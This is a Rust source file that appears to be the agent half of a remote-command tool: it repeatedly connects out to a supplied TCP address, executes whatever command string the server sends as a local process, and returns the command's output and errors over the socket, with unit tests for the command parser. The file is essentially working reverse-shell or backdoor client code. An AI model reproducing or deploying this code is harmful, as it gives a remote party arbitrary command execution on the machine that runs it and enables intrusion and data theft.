use std::io::Write;
use std::net::TcpStream;
use std::process::{Command, Output};
use std::{io, thread, time};

pub fn run(full_address: &str) {
    let duration = time::Duration::from_secs(2);
    loop {
        thread::sleep(duration);
        println!("Connecting to server at {}", full_address);
        let stream = TcpStream::connect(full_address).expect("Failed to connect to server");

        handle_stream(stream);
    }
}

fn handle_stream(mut stream: TcpStream) {
    let mut command = parse_stream(&stream);
    let output = command.output();

    send_command_feedback(&mut stream, &output).unwrap_or_else(|err| {
        //todo : when this happen, store message, then retry later on.
        println!("Failed to send command feedback: {}", err);
    });
}

fn send_command_feedback(
    stream: &mut TcpStream,
    command_output: &Result<Output, io::Error>,
) -> Result<(), io::Error> {
    match command_output {
        Ok(output) => {
            send_output(stream, &output)?;
        }
        Err(err) => {
            send_error(stream, &err)?;
        }
    }
    Ok(())
}

fn send_error(stream: &mut TcpStream, error: &io::Error) -> Result<(), io::Error> {
    let message = format!("{}\n", error);
    stream.write(&message.as_bytes())?;
    Ok(())
}

fn send_output(stream: &mut TcpStream, output: &Output) -> Result<(), io::Error> {
    let message = format!(
        "\n{}\n{}\n",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );

    stream.write(&message.as_bytes())?;
    Ok(())
}

fn parse_stream(stream: &TcpStream) -> Command {
    let mut buffer = [0; 1024];
    stream
        .peek(&mut buffer)
        .expect("Failed to read from stream");

    let input = String::from_utf8_lossy(&buffer[..]);
    let input = input.trim_matches(char::from(0));

    let command = parse_command(&input);

    command
}

fn parse_command(command: &str) -> Command {
    let mut cmd;
    let mut parts = command.split_whitespace();

    match parts.next() {
        Some(part) => {
            cmd = Command::new(part);
        }
        None => {
            return Command::new("");
        }
    }

    loop {
        match parts.next() {
            Some(part) => {
                cmd.arg(part);
            }
            None => break,
        }
    }

    cmd
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_command_with_just_command() {
        let command = "ls";
        let result = parse_command(command);
        assert_eq!(result.get_program(), "ls");
        assert_eq!(result.get_args().count(), 0);
    }

    #[test]
    fn test_parse_command_with_one_arg() {
        let command = "ls -l";
        let result = parse_command(command);
        let args: Vec<&std::ffi::OsStr> = result.get_args().collect();

        assert_eq!(result.get_program(), "ls");
        assert_eq!(args, &["-l"]);
    }

    #[test]
    fn test_parse_command_with_multiple_args_one_dash() {
        let command = "ls -la";
        let result = parse_command(command);
        let args: Vec<&std::ffi::OsStr> = result.get_args().collect();

        assert_eq!(result.get_program(), "ls");
        assert_eq!(args, &["-la"]);
    }

    #[test]
    fn test_parse_command_with_multiple_args_multiple_dashes() {
        let command = "ls -l -a";
        let result = parse_command(command);
        let args: Vec<&std::ffi::OsStr> = result.get_args().collect();

        assert_eq!(result.get_program(), "ls");
        assert_eq!(args, &["-l", "-a"]);
    }

    #[test]
    fn test_parse_command_with_empty_command() {
        let command = "";
        let result = parse_command(command);

        assert_eq!(result.get_program(), "");
        assert_eq!(result.get_args().count(), 0);
    }

    #[test]
    fn test_parse_command_with_whitespace_command() {
        let command = "   ls      -l      -a     ";
        let result = parse_command(command);
        let args: Vec<&std::ffi::OsStr> = result.get_args().collect();

        assert_eq!(result.get_program(), "ls");
        assert_eq!(args, &["-l", "-a"]);
    }
}
